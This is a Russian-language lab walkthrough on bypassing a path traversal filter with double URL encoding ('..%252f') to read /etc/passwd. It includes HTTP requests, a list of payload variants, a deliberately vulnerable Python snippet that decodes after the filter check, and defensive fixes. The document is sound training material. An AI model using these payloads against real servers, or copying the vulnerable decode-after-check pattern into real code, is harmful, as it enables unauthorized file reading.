<a id="goal"></a>

## 🎯 Цель

Использовать уязвимость **File Path Traversal** в механизме отображения изображений товаров и получить содержимое системного файла:

```text
/etc/passwd
```

Приложение блокирует ввод, содержащий traversal-последовательности:

```text
../
```

Однако затем оно выполняет **URL-decode** ввода *перед использованием*.

Для обхода фильтра необходимо передать в параметр:

```text
filename
```

следующее значение:

```text
..%252f..%252f..%252fetc/passwd
```

В этом значении нет литеральной последовательности `../` в момент проверки фильтром, но после второго прохода URL-декодирования сервер получает:

```text
../../../etc/passwd
```

<a id="theory"></a>

## 🧠 Краткая теория

**Path Traversal** — это уязвимость, при которой пользователь может влиять на путь к файлу, читаемому сервером.

Приложение ожидает обычное имя изображения:

```text
filename=58.jpg
```

Сервер может формировать путь примерно так:

```text
/var/www/images/58.jpg
```

При отсутствии корректной проверки атакующий пытается передать:

```text
../../../etc/passwd
```

Последовательность:

```text
../
```

означает переход на один каталог выше.

В этой лаборатории разработчик попытался защититься, блокируя любой ввод, содержащий `../`. Слабость в том, что значение **URL-декодируется ещё раз уже после работы фильтра**.

Каждый веб-фреймворк декодирует URL-закодированные символы при разборе query string. Здесь приложение выполняет одно *дополнительное* декодирование. Из-за этого второго декодирования дважды закодированный слеш:

```text
%252f
```

проходит фильтр как безобидный текст, но превращается в настоящий слеш:

```text
/
```

только на последнем шаге — уже после того, как фильтр одобрил значение.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Стандартный payload:

```text
../../../etc/passwd
```

блокируется сразу, потому что фильтр видит литеральную последовательность `../`.

Одинарно закодированный payload:

```text
..%2f..%2f..%2fetc/passwd
```

тоже блокируется. Веб-фреймворк декодирует `%2f` в `/` при разборе запроса, поэтому к моменту работы фильтра приложения значение снова выглядит как:

```text
../../../etc/passwd
```

Фильтр видит `../` и отклоняет запрос.

Рабочий подход — **двойное кодирование**:

```text
..%252f..%252f..%252fetc/passwd
```

Схема обработки:

```text
..%252f..%252f..%252fetc/passwd
                ↓ декодирование №1 (веб-фреймворк)
..%2f..%2f..%2fetc/passwd          ← фильтр не видит "../", пропускает
                ↓ декодирование №2 (приложение, superfluous)
../../../etc/passwd                 ← traversal-последовательность создана
                ↓ разрешение пути
/etc/passwd                          ← файл прочитан
```

Ключевой момент — **порядок операций**: фильтр выполняется между двумя шагами декодирования, а не после завершения всех декодирований.

<a id="path-traversal"></a>

## 📁 Что такое Path Traversal

Path Traversal также называют:

```text
Directory Traversal
```

или:

```text
dot-dot-slash attack
```

Основная последовательность для Linux/Unix:

```text
../
```

Для Windows также может использоваться:

```text
..\
```

Назначение `../`:

```text
перейти в родительский каталог
```

Пример исходного каталога:

```text
/var/www/images/
```

После одного перехода:

```text
/var/www/
```

После двух:

```text
/var/
```

После трёх:

```text
/
```

Затем можно обратиться к:

```text
/etc/passwd
```

Итоговый путь:

```text
/var/www/images/../../../etc/passwd
```

после нормализации превращается в:

```text
/etc/passwd
```

<a id="superfluous"></a>

## 🔁 Что означает superfluous URL-decode

Слово:

```text
superfluous
```

означает *избыточный* или *лишний*.

В обычном запросе URL-закодированный параметр декодируется ровно один раз — веб-фреймворком или сервером при разборе запроса:

```text
filename=58%2ejpg  →  58.jpg
```

В этой лаборатории приложение декодирует значение **второй раз**, вручную, перед построением пути к файлу. Это второе декодирование избыточно: для легитимных значений, таких как `58.jpg`, оно ничего не меняет. Разработчик, вероятно, добавил его «для безопасности».

Упрощённая уязвимая реализация может выглядеть так:

```python
filename = request.args.get("filename")      # уже декодировано фреймворком один раз
if "../" in filename or "..\\" in filename:
    return "Access denied"
filename = urllib.parse.unquote(filename)     # избыточное второе декодирование
path = "/var/www/images/" + filename
return open(path, "rb").read()
```

Именно второй вызов `unquote()` — корень проблемы. Он превращает закодированные символы в настоящие *после* проверки безопасности, поэтому любой символ, закодированный дважды, переживает фильтр и становится опасным только позже.

<a id="payload-building"></a>

## 🔬 Как формируется рабочий payload

Обычный символ слеша имеет URL-закодированную форму:

```text
%2f
```

Если значение декодируется дважды, слеш должен быть закодирован дважды:

```text
%252f
```

Шаги декодирования:

```text
%252f
  ↓ декодирование №1
%2f
  ↓ декодирование №2
/
```

Один traversal-сегмент строится так:

```text
..%252f
```

В момент проверки фильтром он выглядит как:

```text
..%2f
```

то есть **не содержит** последовательности `../`, и фильтр его пропускает. После декодирования приложением получается:

```text
../
```

Для выхода на три каталога выше используются три сегмента:

```text
..%252f..%252f..%252f
```

После финального декодирования:

```text
../../../
```

Добавляя целевой файл, получаем рабочий payload:

```text
..%252f..%252f..%252fetc/passwd
```

который превращается в:

```text
../../../etc/passwd
```

## 🗂 Как приложение загружает изображения

Лаборатория содержит уязвимость в функции отображения изображений товаров.

Когда пользователь открывает страницу товара, браузер отправляет отдельный запрос за изображением.

Пример:

```http

```

Параметр:

```text

```

указывает серверу, какой файл необходимо прочитать.

Предположительно приложение использует каталог:

```text
/var/www/images/
```

Для нормального значения:

```text
58.jpg
```

формируется:

```text
/var/www/images/58.jpg
```

Для вредоносного значения после двойного декодирования формируется:

```text
/var/www/images/../../../etc/passwd
```

Файловая система нормализует этот путь до:

```text
/etc/passwd
```

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика фильтрации

Упрощённая уязвимая реализация может выглядеть так:

```python
filename = request.args.get("filename")
if "../" in filename:
    return "Access denied"

filename = urllib.parse.unquote(filename)   # декодирование ПОСЛЕ проверки
path = "/var/www/images/" + filename

return open(path, "rb").read()
```

Разработчик предполагает, что отклонение любого значения, содержащего:

```text
../
```

предотвращает выход из каталога изображений.

Но вход:

```text
..%252f..%252f..%252fetc/passwd
```

в момент работы фильтра не содержит `../`, поэтому проходит. Второе декодирование затем даёт:

```text
../../../etc/passwd
```

Приложение объединяет его с базовым каталогом:

```text
/var/www/images/../../../etc/passwd
```

и читает системный файл.

Уязвимая схема:

```text
User-controlled filename
        ↓
Веб-фреймворк декодирует один раз (%252f → %2f)
        ↓
Фильтр ищет "../" — не находит
        ↓
Приложение декодирует ещё раз (%2f → /)
        ↓
Конкатенация с каталогом изображений
        ↓
Нормализация файловой системой
        ↓
Чтение /etc/passwd
```

<a id="step4"></a>

## 🔍 Шаг 4 — Проверить одинарное URL-кодирование

Заменить значение параметра `filename` на одинарно закодированный payload:

```text
..%2f..%2f..%2fetc/passwd
```

Запрос:

```http
GET /image?filename=..%2f..%2f..%2fetc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Эта попытка тоже блокируется. Причина: веб-фреймворк декодирует `%2f` в `/` при разборе query string, поэтому фильтр приложения снова получает:

```text
../../../etc/passwd
```

и отклоняет его.

Результат всё равно полезен: он доказывает, что фильтр видит значение **после одного прохода декодирования**. Значит, обход должен пережить этот первый проход и стать опасным только после *второго* декодирования — то есть необходимо двойное кодирование.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Использовать двойное URL-кодирование

Заменить значение параметра `filename` на:

```text
..%252f..%252f..%252fetc/passwd
```

Модифицированный запрос:

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Отправить запрос кнопкой:

```text
Send
```

Логика преобразования:

```text
..%252f..%252f..%252fetc/passwd
        ↓ декодирование №1 (фреймворк): %252f → %2f
..%2f..%2f..%2fetc/passwd          ← фильтр: "../" нет, пропуск
        ↓ декодирование №2 (приложение): %2f → /
../../../etc/passwd
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

Уязвимость возникла из-за сочетания нескольких ошибок.

### 1. Пользователь контролирует имя файла

Параметр:

```text
filename
```

передаётся клиентом.

### 2. Значение используется при построении пути

Сервер добавляет пользовательское значение к каталогу изображений.

### 3. Защита основана на блокировке `../`

Приложение отклоняет значения, содержащие литеральную последовательность `../`.

### 4. Значение декодируется более одного раза

Фреймворк декодирует один раз при разборе запроса, а приложение декодирует ещё раз перед использованием. Это второе декодирование избыточно.

### 5. Фильтр выполняется между проходами декодирования

Фильтр проверяет значение после первого декодирования, но до второго, поэтому дважды закодированные символы невидимы для него в момент проверки.

### 6. Итоговый путь не проверяется

Приложение не проверяет, что нормализованный путь остаётся внутри каталога изображений.

### 7. Процесс приложения имеет право читать файл

Веб-приложение может прочитать `/etc/passwd`, поэтому файл возвращается пользователю.

<a id="transformation"></a>

## 🧭 Как `%252f` превращается в `/`

Слеш, закодированный один раз:

```text
%2f
```

Слеш, закодированный дважды:

```text
%252f
```

Цепочка декодирования:

```text
%252f
  ↓ первое URL-декодирование
%2f
  ↓ второе URL-декодирование
/
```

Для одного traversal-сегмента:

```text
..%252f
  ↓ первое URL-декодирование
..%2f       ← фильтр видит это, "../" внутри нет, пропуск
  ↓ второе URL-декодирование
../
```

Для полного payload:

```text
..%252f..%252f..%252fetc/passwd
```

преобразование выглядит так:

```text
..%252f  →  ..%2f  →  ../
..%252f  →  ..%2f  →  ../
..%252f  →  ..%2f  →  ../
```

Результат:

```text
../../../etc/passwd
```

Затем:

```text
/var/www/images/../../../etc/passwd
```

нормализуется до:

```text
/etc/passwd
```

## 🐧 Почему используется `/etc/passwd`

`/etc/passwd` — стандартный файл Linux/Unix.

Он содержит информацию о локальных учётных записях.

Формат строки:

```text
username:x:UID:GID:comment:home:shell
```

Пример:

```text
root:x:0:0:root:/root:/bin/bash
```

Поля означают:

```text
root        имя пользователя
x           пароль хранится не здесь
0           UID
0           GID
root        описание
/root       домашний каталог
/bin/bash   командная оболочка
```

Важно:

```text
/etc/passwd обычно не содержит хеши паролей
```

Современные Linux-системы обычно хранят хеши в:

```text
/etc/shadow
```

который доступен только привилегированным процессам.

В лаборатории `/etc/passwd` используется как безопасное доказательство произвольного чтения файлов.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Если приложение принимает имя файла, необходимо проверить не только обычный `../`, но и способы обхода фильтра.

Полезные вопросы:

```text
Блокируется ли ../ или запрос полностью отклоняется?
```

```text
Декодируется ли ввод до или после фильтра?
```

```text
Сколько проходов декодирования проходит значение?
```

```text
Работает ли одинарное кодирование? Двойное?
```

```text
Можно ли использовать абсолютный путь?
```

```text
Можно ли использовать обратный слеш?
```

```text
Проверяется ли итоговый канонический путь?
```

Параметры, которые стоит тестировать:

```text
file
filename
path
document
template
page
image
download
folder
```

Общий подход:

```text
1. Найти параметр, связанный с файлом
2. Определить нормальное значение
3. Проверить ../
4. Проанализировать реакцию фильтра
5. Попробовать варианты кодирования: %2f, %252f, %2e%2e%2f, ...
6. Сравнить status, body, length и Content-Type
7. Проверить содержимое ответа
```

<a id="additional-tests"></a>

## 🧪 Дополнительные проверки

В рамках разрешённой лаборатории можно сравнить следующие варианты:

### Обычный traversal (блокируется)

```text
../../../etc/passwd
```

### Одинарное URL-кодирование (блокируется — декодируется фреймворком до фильтра)

```text
..%2f..%2f..%2fetc%2fpasswd
```

### Двойное URL-кодирование (работает для данной лаборатории)

```text
..%252f..%252f..%252fetc/passwd
```

### Полностью дважды закодированный payload

```text
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Закодированные точки, обычные слеши

```text
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### Вложенные последовательности

```text
....//....//....//etc/passwd
```

### Абсолютный путь

```text
/etc/passwd
```

### Windows-вариант

```text
..\..\..\windows\win.ini
```

Рабочий вариант именно для данной лаборатории:

```text
..%252f..%252f..%252fetc/passwd
```

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Изменять запрос страницы товара

Уязвимость находится в отдельном запросе изображения:

```http
GET /image?filename=...
```

### Ошибка 2. Изменять не тот параметр

Нужен параметр:

```text
filename
```

### Ошибка 3. Продолжать использовать обычный `../`

Литеральные traversal-последовательности блокируются фильтром.

### Ошибка 4. Использовать только одинарное URL-кодирование

Значение:

```text
..%2f..%2f..%2fetc/passwd
```

декодируется веб-фреймворком до работы фильтра, поэтому тоже блокируется.

### Ошибка 5. Забывать, что фреймворк декодирует один раз

Без учёта первого декодирования количество слоёв кодирования неверно. Здесь нужны два слоя.

### Ошибка 6. Использовать недостаточно переходов

Для данной лаборатории нужно три перехода:

```text
..%252f..%252f..%252f
```

### Ошибка 7. Пропустить имя целевого файла

Полный payload:

```text
..%252f..%252f..%252fetc/passwd
```

### Ошибка 8. Позволить Burp перекодировать payload

В Repeater значение нужно вводить литерально. Если инструмент добавит ещё один слой кодирования к `%252f`, обход не сработает. Перед отправкой проверяйте исходную строку запроса.

### Ошибка 9. Смотреть только на HTTP status

Успешный и неуспешный запросы могут оба возвращать `200 OK`.

Нужно анализировать тело ответа.

### Ошибка 10. Ожидать JPEG

После эксплуатации сервер возвращает текст `/etc/passwd`, а не изображение.

### Ошибка 11. Считать фильтр полноценной защитой

Блокировка одного представления строки не заменяет анализ порядка декодирования и проверку итогового пути.

<a id="defense"></a>

## 🛡 Защита

### 1. Не принимать путь от пользователя

Вместо имени файла передавать идентификатор:

```text
image_id=58
```

На сервере использовать таблицу соответствий:

```python
allowed_images = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 2. Использовать allowlist

Разрешать только заранее известные имена файлов.

Пример строгой проверки:

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Декодировать ввод только один раз, в одной точке

Не вызывать `unquote()` повторно внутри приложения. Если фреймворк уже декодировал параметр, дальнейшее декодирование не требуется.

### 4. Проверять после завершения всех декодирований

Проверка безопасности должна выполняться над **финальным** значением, которое используется для построения пути, — никогда до завершения всех проходов декодирования.

### 5. Нормализовать итоговый путь

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
```

### 6. Проверять принадлежность базовой директории

```python
if not target.startswith(base + os.sep):
    reject_request()
```

### 7. Использовать basename только как дополнительную меру

```python
filename = os.path.basename(user_input)
```

Это полезно, но не должно быть единственной защитой.

### 8. Применять минимальные права

Процесс веб-приложения должен иметь доступ только к необходимым файлам.

### 9. Не раскрывать подробные ошибки

Ошибки не должны показывать:

- абсолютные пути;
- структуру каталогов;
- имена внутренних файлов;
- stack trace.

### 10. Логировать подозрительные значения

Примеры:

```text
../
..%2f
..%252f
%2e%2e%2f
%252e%252e%252f
....//
..\
```

Логирование помогает обнаруживать атаки, но не заменяет корректную валидацию.

<a id="conclusion"></a>

## 🧾 Итог

Приложение пыталось предотвратить Path Traversal, блокируя ввод, содержащий:

```text
../
```

Однако значение URL-декодировалось второй раз **после** того, как фильтр уже одобрил его.

Payload:

```text
..%252f..%252f..%252fetc/passwd
```

после второго прохода декодирования превращался в:

```text
../../../etc/passwd
```

Это позволило выйти из каталога изображений и прочитать:

```text
/etc/passwd
```

Главные выводы:

```text
Порядок фильтрации и декодирования — критически важная деталь безопасности.
```

```text
Финальное значение должно проверяться после ВСЕХ проходов декодирования.
```

```text
Ввод не должен декодироваться более одного раза без повторной валидации.
```

```text
Безопасность должна основываться на нормализации и проверке итогового канонического пути.
```

```text
Нормализованный путь обязан оставаться внутри разрешённой базовой директории.
```
